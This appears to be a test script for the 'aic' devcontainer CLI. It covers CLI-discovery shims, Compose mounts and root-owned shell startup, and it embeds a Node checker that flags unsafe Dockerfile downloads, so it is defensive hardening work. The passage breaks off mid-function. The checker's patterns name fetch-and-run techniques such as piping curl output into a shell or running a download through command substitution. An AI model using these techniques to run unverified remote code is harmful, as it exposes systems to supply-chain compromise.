#!/usr/bin/env bash
set -euo pipefail

ROOT=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
REAL_DOCKER=$(command -v docker)
REAL_DOCKER_CONFIG=${DOCKER_CONFIG:-$HOME/.docker}
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
export HOME="$TMP/host-home"
export DOCKER_CONFIG="$REAL_DOCKER_CONFIG"
mkdir -p "$HOME"

fail() { echo "FAIL: $*" >&2; exit 1; }

# A developer's exported name would make every direct-start check below refuse.
unset COMPOSE_PROJECT_NAME

help=$(AIC_NO_UPDATE_CHECK=1 "$ROOT/aic" help)
[ "$(printf '%s\n' "$help" | grep -c '^  AIC_NO_OVERRIDE_SCAN')" = "1" ] \
  || fail "help duplicated or dropped AIC_NO_OVERRIDE_SCAN"
for shell in bash zsh fish; do
  completion=$("$ROOT/aic" completion "$shell")
  for command in doctor status validate; do
    case "$completion" in
      *"$command"*) ;;
      *) fail "$shell completion omitted $command" ;;
    esac
  done
  if [ "$shell" = "fish" ]; then
    case "$completion" in
      *'-l docker-read'*) ;;
      *) fail "fish completion omitted --docker-read" ;;
    esac
  else
    case "$completion" in
      *--docker-read*) ;;
      *) fail "$shell completion omitted --docker-read" ;;
    esac
  fi
done

# `aic __supports initialize` is the internal capability probe that the
# generated initializer runs. It must be silent and exact: exit 0 only for the
# one capability name, nonzero for anything else, with no output.
probe_home="$TMP/probe-home"
mkdir -p "$probe_home"
probe_run() {
  (cd "$probe_home" && HOME="$probe_home" XDG_STATE_HOME="$probe_home/state" \
    XDG_CACHE_HOME="$probe_home/cache" AIC_NO_UPDATE_CHECK=1 \
    "$ROOT/aic" __supports "$@" 2>&1)
}
out=$(probe_run initialize) || fail "aic __supports initialize exited nonzero"
[ -z "$out" ] || fail "aic __supports initialize printed output: $out"
for probe_args in bogus "" "initialize extra" Initialize check-drift; do
  # shellcheck disable=SC2086 # word splitting builds each argv on purpose
  if out=$(probe_run $probe_args); then
    fail "aic __supports accepted an unknown capability: '$probe_args'"
  fi
  [ -z "$out" ] || fail "aic __supports '$probe_args' printed output: $out"
done
[ -z "$(ls -A "$probe_home")" ] || fail "aic __supports wrote files"
printf '%s\n' "$help" | grep -q '__supports' \
  && fail "help lists the internal __supports probe"
for shell in bash zsh fish; do
  "$ROOT/aic" completion "$shell" | grep -q '__supports' \
    && fail "$shell completion lists the internal __supports probe"
done

# GUI-launched editors often have a trimmed PATH, so initializeCommand scans
# common install paths and Node-manager shims. It must skip an old or
# incompatible aic and choose the last supported nvm/fnm fallback rather than
# stopping at the first glob match. A Volta shim is a binary and an asdf/mise
# shim is a wrapper script, so neither contains the CLI's text: the initializer
# must ask the candidate (`__supports initialize`) instead of reading it.
# Execute the actual JSON-encoded command with fixed system paths redirected to
# each isolated fixture home so a developer's own global install cannot
# influence the result.
initializer_bin="$TMP/initializer-bin"
initializer_log="$TMP/initializer.log"
mkdir -p "$initializer_bin"
# An old CLI: no `initialize` command and no probe. Unknown commands print help
# and exit 1, as released aic versions do.
write_old_aic() {
  cat > "$1" <<'SH'
#!/bin/sh
case "${1:-}" in
  version) echo "aic v0.4.0" ;;
  *) echo "usage: aic <command>"; exit 1 ;;
esac
SH
  chmod +x "$1"
}
# A current CLI: answers the probe and logs its tag when `initialize` runs.
write_new_aic() {
  cat > "$1" <<SH
#!/bin/sh
case "\${1:-}" in
  __supports) [ "\$#" -eq 2 ] && [ "\$2" = initialize ] ;;
  initialize) printf '%s\n' '$2' >> "\$AIC_INITIALIZER_TEST_LOG" ;;
  *) echo "usage: aic <command>"; exit 1 ;;
esac
SH
  chmod +x "$1"
}
write_old_aic "$initializer_bin/aic"
initializer_cmd=$(node -e '
  const fs = require("fs");
  const source = fs.readFileSync(process.argv[1], "utf8");
  const match = source.match(/"initializeCommand"\s*:\s*("(?:\\.|[^"\\])*")/);
  if (!match) process.exit(2);
  let command = JSON.parse(match[1]);
  const missing = process.argv[2] + "/missing";
  for (const candidate of ["/opt/homebrew/bin/aic", "/usr/local/bin/aic", "/usr/bin/aic"]) {
    command = command.split(candidate).join(missing + candidate.replaceAll("/", "_"));
  }
  process.stdout.write(command);
' "$ROOT/template/devcontainer.json" "$TMP")
# run_initializer HOME: run the extracted command with the old CLI first on
# PATH; sets initializer_out and initializer_rc, and resets the log. When dash
# is installed, the command must behave the same there as under /bin/sh.
initializer_dash=$(command -v dash 2>/dev/null || true)
run_initializer() {
  local dash_out dash_rc dash_log
  if [ -n "$initializer_dash" ]; then
    : > "$initializer_log"
    set +e
    dash_out=$(HOME="$1" PATH="$initializer_bin:/usr/bin:/bin" \
      AIC_INITIALIZER_TEST_LOG="$initializer_log" "$initializer_dash" -c "$initializer_cmd" 2>&1)
    dash_rc=$?
    set -e
    dash_log=$(cat "$initializer_log")
  fi
  : > "$initializer_log"
  set +e
  initializer_out=$(HOME="$1" PATH="$initializer_bin:/usr/bin:/bin" \
    AIC_INITIALIZER_TEST_LOG="$initializer_log" /bin/sh -c "$initializer_cmd" 2>&1)
  initializer_rc=$?
  set -e
  if [ -n "$initializer_dash" ]; then
    [ "$dash_rc" = "$initializer_rc" ] && [ "$dash_out" = "$initializer_out" ] \
      && [ "$dash_log" = "$(cat "$initializer_log")" ] \
      || fail "initializeCommand behaves differently under dash for $1"
  fi
}
expect_initializer_selects() {
  run_initializer "$1"
  [ "$initializer_rc" -eq 0 ] \
    || fail "initializeCommand did not start $2 (rc=$initializer_rc): $initializer_out"
  [ "$(cat "$initializer_log")" = "$2" ] \
    || fail "initializeCommand ran '$(cat "$initializer_log")' instead of $2"
}
expect_initializer_too_old() {
  run_initializer "$1"
  [ "$initializer_rc" -ne 0 ] || fail "initializeCommand accepted an incompatible host CLI ($2)"
  [ ! -s "$initializer_log" ] || fail "initializeCommand ran initialize on an incompatible host CLI ($2)"
  echo "$initializer_out" | grep -q 'installed host CLI is too old' \
    || fail "initializeCommand omitted the actionable incompatible-CLI diagnosis ($2)"
  echo "$initializer_out" | grep -q 'npm update -g aicontainer' \
    || fail "initializeCommand omitted the CLI upgrade command ($2)"
}

# nvm: skip the old PATH CLI and scan every supported glob fallback.
nvm_home="$TMP/launcher-nvm"
mkdir -p "$nvm_home/.nvm/versions/node/v18.20.0/bin" \
  "$nvm_home/.nvm/versions/node/v22.22.0/bin"
write_new_aic "$nvm_home/.nvm/versions/node/v18.20.0/bin/aic" v18
write_new_aic "$nvm_home/.nvm/versions/node/v22.22.0/bin/aic" v22
expect_initializer_selects "$nvm_home" v22

# fnm uses the same glob fallback.
fnm_home="$TMP/launcher-fnm"
mkdir -p "$fnm_home/.local/share/fnm/node-versions/v22.22.0/installation/bin"
write_new_aic "$fnm_home/.local/share/fnm/node-versions/v22.22.0/installation/bin/aic" fnm
expect_initializer_selects "$fnm_home" fnm

# Volta: ~/.volta/bin/aic is a symlink to one shim that dispatches by the name
# it was called with. The shim text never contains the CLI's commands. The
# probe must also beat a later supported nvm fallback.
volta_home="$TMP/launcher-volta"
volta_package="$volta_home/.volta/tools/image/packages/aicontainer/bin"
mkdir -p "$volta_home/.volta/bin" "$volta_package" \
  "$volta_home/.nvm/versions/node/v22.22.0/bin"
write_new_aic "$volta_package/aic" volta
write_new_aic "$volta_home/.nvm/versions/node/v22.22.0/bin/aic" nvm
cat > "$volta_home/.volta/bin/volta-shim" <<SH
#!/bin/sh
tool=\$(basename "\$0")
exec "$volta_package/\$tool" "\$@"
SH
chmod +x "$volta_home/.volta/bin/volta-shim"
ln -s volta-shim "$volta_home/.volta/bin/aic"
grep -Eq 'initialize' "$volta_home/.volta/bin/aic" \
  && fail "Volta shim fixture must not contain the CLI's command text"
expect_initializer_selects "$volta_home" volta

# The same shim in front of an old CLI fails closed with the upgrade hint.
write_old_aic "$volta_package/aic"
rm -rf "$volta_home/.nvm"
expect_initializer_too_old "$volta_home" "old CLI behind a Volta shim"

# asdf: ~/.asdf/shims/aic is a wrapper script that execs the real tool.
asdf_home="$TMP/launcher-asdf"
asdf_install="$asdf_home/.asdf/installs/nodejs/22.22.0/bin"
mkdir -p "$asdf_home/.asdf/shims" "$asdf_install"
write_new_aic "$asdf_install/aic" asdf
cat > "$asdf_home/.asdf/shims/aic" <<SH
#!/bin/sh
# asdf-plugin: nodejs 22.22.0
exec "$asdf_install/aic" "\$@"
SH
chmod +x "$asdf_home/.asdf/shims/aic"
grep -Eq 'initialize' "$asdf_home/.asdf/shims/aic" \
  && fail "asdf shim fixture must not contain the CLI's command text"
expect_initializer_selects "$asdf_home" asdf

# mise: same wrapper shape under ~/.local/share/mise/shims.
mise_home="$TMP/launcher-mise"
mise_install="$mise_home/.local/share/mise/installs/node/22.22.0/bin"
mkdir -p "$mise_home/.local/share/mise/shims" "$mise_install"
write_new_aic "$mise_install/aic" mise
cat > "$mise_home/.local/share/mise/shims/aic" <<SH
#!/bin/sh
exec "$mise_install/aic" "\$@"
SH
chmod +x "$mise_home/.local/share/mise/shims/aic"
expect_initializer_selects "$mise_home" mise

# A plain-script CLI that has `initialize` but predates the probe is still
# capable: the grep fallback accepts it instead of a false "too old".
legacy_home="$TMP/launcher-legacy"
mkdir -p "$legacy_home/.aicontainer"
cat > "$legacy_home/.aicontainer/aic" <<'SH'
#!/bin/sh
case "${1:-}" in
  initialize) printf '%s\n' legacy >> "$AIC_INITIALIZER_TEST_LOG" ;;
  *) echo "usage: aic <command>"; exit 1 ;;
esac
SH
chmod +x "$legacy_home/.aicontainer/aic"
expect_initializer_selects "$legacy_home" legacy

# Only incompatible CLIs: the nvm fallbacks are not executable.
chmod -x "$nvm_home/.nvm/versions/node/v18.20.0/bin/aic" \
  "$nvm_home/.nvm/versions/node/v22.22.0/bin/aic"
expect_initializer_too_old "$nvm_home" "old PATH CLI only"

new_project() {
  local dir="$1"
  mkdir -p "$dir"
  git -C "$dir" init -q
  (cd "$dir" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
    "$ROOT/aic" init --with codex --shell zsh >/dev/null)
}

# The managed project name is path-unique even for equal basenames.
new_project "$TMP/one/api"
new_project "$TMP/two/api"
name1=$(sed -n 's/^name:[[:space:]]*//p' "$TMP/one/api/.devcontainer/docker-compose.yml")
name2=$(sed -n 's/^name:[[:space:]]*//p' "$TMP/two/api/.devcontainer/docker-compose.yml")
[ -n "$name1" ] && [ -n "$name2" ] && [ "$name1" != "$name2" ] \
  || fail "same-basename projects did not get unique Compose names"
version=$(node -p 'require(process.argv[1]).version' "$ROOT/package.json")
[ "$(grep -c "^[[:space:]]*image: ghcr.io/stefanoginella/aicontainer:v$version" \
    "$TMP/one/api/.devcontainer/docker-compose.yml")" = "3" ] \
  || fail "pull-mode compose did not pin all three managed image services"
[ "$(grep -c 'ghcr.io/stefanoginella/aicontainer:latest' \
    "$ROOT/template/docker-compose.pull.yml")" = "5" ] \
  || fail "pull template latest placeholders drifted from the CLI pin rewrite"
# Compose 2.38.x cannot inspect an uninterpolated ${VAR:-default} inside short
# source:target:mode mount syntax. Keep the two managed socket binds long-form
# so raw host-interpolation validation works on supported Linux runners.
for compose in "$ROOT/template/docker-compose.pull.yml" \
  "$ROOT/template/docker-compose.build.yml"; do
  [ "$(grep -Fc 'source: ${AIC_DOCKER_SOCKET:-/var/run/docker.sock}' "$compose")" = "2" ] \
    || fail "managed Docker socket mounts are not both long-form"
  grep -Fq '${AIC_DOCKER_SOCKET:-/var/run/docker.sock}:' "$compose" \
    && fail "managed Docker socket mount regressed to Compose-2.38-incompatible short syntax"
  # The template is the baseline that every override is compared with, so a
  # dropped Git control mount would pass validation silently.
  for mount in '../.git:/workspace/.git' '../.git/config:/workspace/.git/config:ro' \
    '../.git/config.worktree:/workspace/.git/config.worktree:ro' \
    '../.git/commondir:/workspace/.git/commondir:ro' '../.git/hooks:/workspace/.git/hooks:ro'; do
    grep -Fqx "      - $mount" "$compose" || fail "$(basename "$compose") lost the Git control mount $mount"
  done
  # gh and npm config is per-project. Only the credential bridge may see the
  # global gh/npm subpaths; a writable shared mount in the devcontainer lets
  # one project plant pager/registry/script-shell config for every other one.
  for target in /home/vscode/.config/gh /home/vscode/.config/npm; do
    grep -Fq "target: $target" "$compose" \
      && fail "$(basename "$compose") mounts shared $target into the devcontainer"
  done
  for target in /auth-global/gh /auth-global/npm; do
    [ "$(grep -Fxc "        target: $target" "$compose")" = "1" ] \
      || fail "$(basename "$compose") does not give the credential bridge $target"
  done
done
for tool in gh npm; do
  grep -Fq "ln -s /home/vscode/.aic-sessions/tool-homes/$tool /home/vscode/.config/$tool" \
    "$ROOT/template/Dockerfile" \
    || fail "image does not link ~/.config/$tool into the per-project sessions volume"
done
# Shell startup must run only root-owned code: an agent could otherwise plant
# code in a vscode-owned oh-my-zsh, fnm, cache, home rc file, or a same-named
# tool earlier in PATH, and it would run in the next human shell.
zshrc="$ROOT/template/.zshrc"
dockerfile="$ROOT/template/Dockerfile"
zshrc_line() { grep -nFx "$1" "$zshrc" | head -n 1 | cut -d: -f1 || true; }
omz_source=$(zshrc_line 'source "$ZSH/oh-my-zsh.sh"')
[ -n "$omz_source" ] || fail ".zshrc does not source oh-my-zsh"
for line in 'export ZSH=/usr/local/share/oh-my-zsh' \
  'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' \
  'XDG_CACHE_HOME=/usr/local/share/aic/zsh-cache'; do
  n=$(zshrc_line "$line")
  [ -n "$n" ] && [ "$n" -lt "$omz_source" ] \
    || fail ".zshrc does not set '$line' before oh-my-zsh loads"
done
n=$(zshrc_line 'PATH=$_aic_path')
[ -n "$n" ] && [ "$n" -gt "$omz_source" ] \
  || fail ".zshrc does not restore the full PATH after oh-my-zsh loads"
grep -Fqx 'eval "$(/usr/local/bin/fnm env --use-on-cd --shell zsh)"' "$zshrc" \
  || fail ".zshrc does not run the root-owned fnm"
if grep -Ev '^[[:space:]]*#' "$zshrc" | grep -Eq '~/|\$HOME|\$\{HOME'; then
  fail ".zshrc reads a file in the vscode-owned home"
fi
for line in 'COPY .zshrc /etc/aic/shell/zsh/.zshrc' \
  'RUN mv /home/vscode/.oh-my-zsh /usr/local/share/oh-my-zsh \' \
  '    && chown -R root:root /usr/local/share/oh-my-zsh \' \
  '    && GITSTATUS_CACHE_DIR="$p10k/gitstatus/usrbin" sh "$p10k/gitstatus/install" -f \' \
  '    && install -o root -g root -m 0755 /home/vscode/.fnm/fnm /usr/local/bin/fnm \' \
  'unsetopt GLOBAL_RCS' \
  'RUN cat > /etc/bash.bashrc <<'"'"'BASHBASHRC_EOF'"'"'' \
  'eval "$(/usr/local/bin/fnm env --use-on-cd --shell bash)"' \
  '/usr/local/bin/fnm env --use-on-cd --shell fish | source'; do
  grep -Fqx -- "$line" "$dockerfile" || fail "Dockerfile lost root-managed shell startup: $line"
done
grep -Fq "sed -e '/^if \\[ -f ~\\/\\.bash_aliases \\]; then\$/,/^fi\$/d'" "$dockerfile" \
  || fail "managed bashrc still sources ~/.bash_aliases"
# Image download integrity (docs/contributing/image-integrity.md). `sh -c "$(curl …)"` exits 0 when curl
# fails, and a pipe into a shell or an unpacker runs whatever arrived. Every
# curl or git fetch must start with `set -eu`, use no `||` or `set +e`, and be
# `curl -f --proto '=https' --tlsv1.2 -o FILE`. The first use of each pinned
# file is its check: `echo "$SHA256  FILE" | sha256sum -c -;`, a fingerprint
# allow-list for apt keys, or gpgv with a sha256-pinned keyring for Node. Git
# sources are pinned commits on their upstream branch; only the named vendor
# installers float. The --self-test run proves that each known bypass is
# reported and that equivalent safe forms still pass.
cat > "$TMP/check-dockerfile-downloads.js" <<'NODE'
'use strict';
// Usage: node check-dockerfile-downloads.js DOCKERFILE [--self-test]
const fs = require('fs');

// Dockerfile -> instructions. Continuation lines are joined; heredoc bodies are
// kept apart; a `# renovate:` comment attaches to the next instruction.
function parseDockerfile(source) {
  const instructions = [];
  let cur = null, heredoc = null, continued = false, renovate = null;
  for (const line of source.split('\n')) {
    if (heredoc) {
      if (line === heredoc) heredoc = null; else cur.body += line + '\n';
      continue;
    }
    const trimmed = line.trim();
    if (!continued && trimmed.startsWith('#')) {
      const r = trimmed.match(/^# renovate: (.*)$/);
      renovate = r ? Object.fromEntries(r[1].trim().split(/\s+/).map(kv => kv.split('='))) : null;
      continue;
    }
    if (!continued && trimmed === '') continue;
    if (continued && trimmed.startsWith('#')) continue;
    const endsWithBackslash = trimmed.endsWith('\\');
    const piece = endsWithBackslash ? trimmed.slice(0, -1).trim() : trimmed;
    if (continued) cur.text += ' ' + piece;
    else { instructions.push(cur = { text: piece, body: '', renovate }); renovate = null; }
    continued = endsWithBackslash;
    const h = line.match(/<<-?\s*['"]?([A-Za-z_][A-Za-z0-9_]*)['"]?/);
    if (h) heredoc = h[1];
  }
  return instructions;
}

// Shell script -> top-level statements. ; ;; & && || and newlines separate
// statements; a pipeline stays one statement. Quotes, $( ), ${ } and
// backticks are respected, so separators inside them do not split.
function statements(script) {
  const out = [];
  const stack = [];
  let buf = '', pipe = false, prev = 'start';
  const flush = sep => {
    const text = buf.trim();
    if (text) { out.push({ text, before: prev, after: sep, pipe }); prev = sep; }
    else if (sep !== '\n') prev = sep;
    buf = ''; pipe = false;
  };
  for (let i = 0; i < script.length; i++) {
    const c = script[i], n = script[i + 1], ctx = stack[stack.length - 1];
    const k = ctx && ctx.k;
    if (k === 'sq') { buf += c; if (c === "'") stack.pop(); continue; }
    if (c === '\\' && i + 1 < script.length) {
      if (n === '\n') { if (!/ $/.test(buf)) buf += ' '; } else buf += c + n;
      i++; continue;
    }
    if (k === 'bt') { buf += c; if (c === '`') stack.pop(); continue; }
    // Unquoted blanks collapse to one space; quoted text stays exact.
    if ((c === ' ' || c === '\t') && k !== 'dq') { if (!/ $/.test(buf)) buf += ' '; continue; }
    if (c === '$' && n === '(') { stack.push({ k: 'cmd', depth: 1 }); buf += '$('; i++; continue; }
    if (c === '$' && n === '{') { stack.push({ k: 'brace' }); buf += '${'; i++; continue; }
    if (c === '`') { stack.push({ k: 'bt' }); buf += c; continue; }
    if (k === 'dq') { buf += c; if (c === '"') stack.pop(); continue; }
    if (c === "'") { stack.push({ k: 'sq' }); buf += c; continue; }
    if (c === '"') { stack.push({ k: 'dq' }); buf += c; continue; }
    if (k === 'brace') { buf += c; if (c === '}') stack.pop(); continue; }
    if (k === 'cmd') {
      buf += c;
      if (c === '(') ctx.depth++;
      else if (c === ')' && --ctx.depth === 0) stack.pop();
      continue;
    }
    if (c === '#' && /(^|\s)$/.test(buf)) {
      while (i + 1 < script.length && script[i + 1] !== '\n') i++;
      continue;
    }
    if (c === ';') { if (n === ';') { flush(';;'); i++; } else flush(';'); continue; }
    if (c === '&' && (/[<>]$/.test(buf) || n === '>')) { buf += c; continue; } // >&2, &>file
    if (c === '&') { if (n === '&') { flush('&&'); i++; } else flush('&'); continue; }
    if (c === '|') { if (n === '|') { flush('||'); i++; } else { pipe = true; buf += c; } continue; }
    if (c === '\n') { flush('\n'); continue; }
    buf += c;
  }
  flush('end');
  return out;
}

const esc = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
const refersTo = (text, name) => new RegExp('\\$\\{?' + name + '\\b').test(text);
const usesFile = (text, file) => new RegExp(esc(file) + '(?![\\w.\\-/])').test(text);
// `git [-C dir] [-c k=v] [--opt] <sub>`: a subcommand behind global options.
const gitCmd = sub => new RegExp('\\bgit\\s+(?:-[Cc]\\s+\\S+\\s+|--?[A-Za-z][\\w-]*(?:=\\S+)?\\s+)*' + sub + '\\b');
const plainSep = s => [';', '\n', 'start', 'end'].includes(s);
// The only accepted checksum form: a plain statement, `;` (or a newline) on
// both sides, so `||`, `&&`, `if`, `!` or a pipe cannot swallow a mismatch.
const shaCheck = (st, file) => {
  const m = st.text.match(new RegExp('^echo "\\$\\{?([A-Za-z_]\\w*)\\}?  ' + esc(file) + '" \\| sha256sum -c -$'));
  return m && plainSep(st.before) && plainSep(st.after) ? m[1] : null;
};
const assignment = text => text.replace(/^(?:[^\s()=]+\)|\*\))\s*/, '').match(/^([A-Za-z_]\w*)=(.*)$/);
// Does variable `name` get its value (directly or through other variables)
// from text that satisfies `source`?
function derives(stmts, name, source) {
  const rhs = new Map();
  for (const st of stmts) {
    const m = assignment(st.text);
    if (m) rhs.set(m[1], (rhs.get(m[1]) || []).concat(m[2]));
  }
  const seen = new Set();
  const visit = v => {
    if (seen.has(v)) return false;
    seen.add(v);
    return (rhs.get(v) || []).some(r => source(r) || [...r.matchAll(/\$\{?([A-Za-z_]\w*)/g)].some(x => visit(x[1])));
  };
  return visit(name);
}

// Release assets and keys, matched by URL. `sha256`: checked against *_SHA256
// ARGs; `fingerprints`: every primary key must be in a reviewed allow-list;
// `signed`: a detached-signature file verified with gpgv against a sha256-pinned
// keyring; `signed-sum`: checked against a sha256 taken from that verified text.
const PINNED = [
  { name: 'git-delta', kind: 'sha256', url: /^https:\/\/github\.com\/dandavison\/delta\/releases\/download\//, args: ['GIT_DELTA_SHA256_AMD64', 'GIT_DELTA_SHA256_ARM64'], perArch: true },
  { name: 'fzf', kind: 'sha256', url: /^https:\/\/github\.com\/junegunn\/fzf\/releases\/download\//, args: ['FZF_SHA256_AMD64', 'FZF_SHA256_ARM64'], perArch: true },
  { name: 'fnm', kind: 'sha256', url: /^https:\/\/github\.com\/Schniz\/fnm\/releases\/download\//, args: ['FNM_SHA256_AMD64', 'FNM_SHA256_ARM64'], perArch: true },
  { name: 'Node release keyring', kind: 'sha256', url: /^https:\/\/raw\.githubusercontent\.com\/nodejs\/release-keys\/\$\{NODE_RELEASE_KEYS_COMMIT\}\/gpg-only-active-keys\/pubring\.kbx$/, args: ['NODE_RELEASE_KEYS_SHA256'] },
  { name: 'Node SHASUMS256', kind: 'signed', url: /^https:\/\/nodejs\.org\/dist\/latest-v[^/]+\/SHASUMS256\.txt\.asc$/ },
  { name: 'Node.js', kind: 'signed-sum', url: /^https:\/\/nodejs\.org\/dist\/v[^/]+\/node-v[^/]+\.tar\.xz$/, perArch: true },
  { name: 'GitHub CLI apt key', kind: 'fingerprints', url: /^https:\/\/cli\.github\.com\/packages\/githubcli-archive-keyring\.gpg$/, args: ['GH_KEYRING_FINGERPRINTS'] },
  { name: 'Docker apt key', kind: 'fingerprints', url: /^https:\/\/download\.docker\.com\/linux\/[a-z]+\/gpg$/, args: ['DOCKER_KEYRING_FINGERPRINTS'] },
];
// Official self-updating installers: deliberately floating (docs/contributing/image-integrity.md).
const FLOATING = ['https://claude.ai/install.sh', 'https://chatgpt.com/codex/install.sh', 'https://opencode.ai/install'];
// zsh theme and plugins: [repository, commit ARG]; the branch comes from the
// ARG's renovate comment.
const GIT_PINS = [
  ['https://github.com/romkatv/powerlevel10k', 'POWERLEVEL10K_COMMIT'],
  ['https://github.com/zsh-users/zsh-autosuggestions', 'ZSH_AUTOSUGGESTIONS_COMMIT'],
  ['https://github.com/zsh-users/zsh-syntax-highlighting', 'ZSH_SYNTAX_HIGHLIGHTING_COMMIT'],
];
const FPR_LIST = /^[0-9A-F]{40}(?:,[0-9A-F]{40})*$/;

function check(source) {
  const problems = [];
  const instructions = parseDockerfile(source);
  const args = new Map();
  for (const ins of instructions) {
    const m = ins.text.match(/^ARG\s+([A-Za-z_][A-Za-z0-9_]*)(?:=(\S*))?$/);
    if (m) args.set(m[1], { value: m[2] || '', renovate: ins.renovate });
  }
  const arg = name => (args.get(name) || { value: '' }).value;

  for (const { text, body } of instructions) {
    const all = text + '\n' + body;
    const where = text.slice(0, 70);
    if (/\|\s*(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*(?:sudo\s+(?:-\S+\s+)*)?(?:env\s+)?(?:\S*\/)?(?:ba|da|z|k|fi)?sh\b/.test(all)) {
      problems.push(`pipes into a shell: ${where}`);
    }
    if (/(?:\$\(|`)\s*(?:curl|wget)\b/.test(all)) problems.push(`runs a download through command substitution: ${where}`);
    if (/\bwget\b/.test(all)) problems.push(`uses wget instead of the checked curl pattern: ${where}`);
    if (gitCmd('clone').test(all)) problems.push(`clones a git repository instead of fetching a pinned commit: ${where}`);
    if (/^ADD\s+(?:--\S+\s+)*\S*(?:https?|git):/i.test(text)) problems.push(`ADD fetches a URL: ${where}`);
  }

  if (!args.has('TARGETARCH')) problems.push('ARG TARGETARCH is not declared');
  const found = new Set();
  const scripts = [];
  for (const ins of instructions.filter(i => /^RUN\s/.test(i.text))) {
    // `RUN [--flags] <<'X'` runs the heredoc body; otherwise the body is file
    // content written by the command (still checked for downloads).
    const rest = ins.text.replace(/^RUN\s+(?:--\S+\s+)*/, '');
    const heredocScript = /^<<-?\s*['"]?[A-Za-z_]\w*['"]?$/.test(rest);
    const script = heredocScript ? ins.body : rest + '\n' + ins.body;
    scripts.push(script);
    if (!/\bcurl\b/.test(script) && !gitCmd('fetch').test(script)) continue;
    const stmts = statements(script);
    const where = (stmts[0] || { text: rest }).text.slice(0, 60);
    if (!stmts.length || !/^set -eux?(?:o pipefail| -o pipefail)?$/.test(stmts[0].text) || !plainSep(stmts[0].after)) {
      problems.push(`download step does not start with "set -eu;": ${where}`);
    }
    if (/\|\|/.test(script)) problems.push(`download step uses ||, which hides a failed fetch or check: ${where}`);
    if (/\bset\s+\+[A-Za-z]*e|\bset\s+\+o\s+errexit\b/.test(script)) problems.push(`download step turns off errexit (set +e): ${where}`);

    const verifiedKeyrings = new Set();
    const verifiedTexts = new Set();
    stmts.forEach((st, idx) => {
      if (!/\bcurl\b/.test(st.text)) return;
      const url = (st.text.match(/https?:\/\/[^\s"']+/) || [''])[0];
      const label = url || st.text.slice(0, 60);
      if (!/^curl\s/.test(st.text) || st.pipe) { problems.push(`curl must be a plain command writing to a file: ${label}`); return; }
      if (!/\s(?:-[A-Za-z]*f[A-Za-z]*|--fail)(?=\s|$)/.test(st.text)) problems.push(`curl without -f: ${label}`);
      if (!/\s--proto\s+'?=https'?(?=\s|$)/.test(st.text)) problems.push(`curl without --proto '=https': ${label}`);
      if (!/\s--tlsv1\.[23](?=\s|$)/.test(st.text)) problems.push(`curl without --tlsv1.2: ${label}`);
      const out = st.text.match(/\s(?:-o|--output)\s+("[^"]*"|'[^']*'|\S+)/);
      if (!out) { problems.push(`curl does not write to a file with -o: ${label}`); return; }
      if (!url.startsWith('https://')) { problems.push(`curl URL is not https: ${label}`); return; }
      if (FLOATING.includes(url)) return;
      const entry = PINNED.find(p => p.url.test(url));
      if (!entry) { problems.push(`download has no pin and is not an allowed floating installer: ${url}`); return; }
      found.add(entry.name);
      const file = out[1].replace(/^["']|["']$/g, '');
      const rest = stmts.slice(idx + 1);
      const useAt = rest.findIndex(s => usesFile(s.text, file));
      const first = useAt < 0 ? null : rest[useAt];
      const firstUse = `${entry.name}: the first use after download is not`;
      for (const name of entry.args || []) {
        if (!refersTo(script, name)) problems.push(`${entry.name}: download step does not use ARG ${name}`);
      }
      if (entry.perArch && !(refersTo(script, 'TARGETARCH') && /\*\)[^;]*;\s*exit 1/.test(script))) {
        problems.push(`${entry.name}: per-architecture asset is not selected by TARGETARCH with a failing default`);
      }
      if (entry.kind === 'sha256' || entry.kind === 'signed-sum') {
        const v = first && shaCheck(first, file);
        if (!v) { problems.push(`${firstUse} the plain statement: echo "$SHA256  ${file}" | sha256sum -c -;`); return; }
        if (entry.kind === 'sha256') {
          for (const name of entry.args) {
            if (!/^[0-9a-f]{64}$/.test(arg(name))) problems.push(`${entry.name}: ARG ${name} is not a pinned sha256`);
          }
          if (!entry.args.includes(v) && !derives(stmts, v, r => entry.args.some(a => refersTo(r, a)))) {
            problems.push(`${entry.name}: checksum $${v} does not come from its *_SHA256 ARGs`);
          }
          verifiedKeyrings.add(file);
        } else if (![...verifiedTexts].some(t => derives(stmts, v, r => usesFile(r, t)))) {
          problems.push(`${entry.name}: checksum $${v} does not come from gpgv-verified text`);
        }
      } else if (entry.kind === 'signed') {
        const m = first && first.text.match(new RegExp('^gpgv --keyring "([^"]+)" --output "([^"]+)" "' + esc(file) + '"$'));
        if (!m || !plainSep(first.before) || !plainSep(first.after)) {
          problems.push(`${firstUse} the plain statement: gpgv --keyring "KEYRING" --output "VERIFIED" "${file}";`);
          return;
        }
        if (!verifiedKeyrings.has(m[1])) problems.push(`${entry.name}: gpgv keyring ${m[1]} is not a sha256-checked download`);
        if (rest.slice(useAt + 1).some(s => usesFile(s.text, file))) problems.push(`${entry.name}: the unverified ${file} is read after gpgv`);
        verifiedTexts.add(m[2]);
        if (!/^\d+\.\d+\.\d+$/.test(arg('NODE_MIN_VERSION'))) problems.push('ARG NODE_MIN_VERSION is not a version floor');
        const floor = rest.findIndex(s => /^if ! printf '%s\\n' "\$NODE_MIN_VERSION" "\$\w+" \| sort -C -V$/.test(s.text));
        if (floor < 0 || !rest.slice(floor + 1, floor + 4).some(s => s.text === 'exit 1')) {
          problems.push(`${entry.name}: no rollback guard against NODE_MIN_VERSION (sort -C -V)`);
        }
      } else if (entry.kind === 'fingerprints') {
        const allowed = entry.args[0];
        if (!FPR_LIST.test(arg(allowed))) problems.push(`${entry.name}: ARG ${allowed} is not a list of key fingerprints`);
        const m = first && first.text.match(new RegExp('^([A-Za-z_]\\w*)=\\$\\(gpg --batch --show-keys --with-colons "' + esc(file) +
          '" \\| awk -F: \'\\$1 == "pub" \\{ p = 1; next \\} \\$1 == "fpr" && p \\{ print \\$10; p = 0 \\}\'\\)$'));
        if (!m) { problems.push(`${firstUse} listing its primary key fingerprints with gpg --show-keys`); return; }
        const keys = m[1];
        const after = rest.slice(useAt + 1);
        const next = after.findIndex(s => usesFile(s.text, file));
        const between = next < 0 ? after : after.slice(0, next);
        const at = re => between.findIndex(s => re.test(s.text));
        const steps = [
          at(new RegExp('^test -n "\\$' + keys + '"$')),
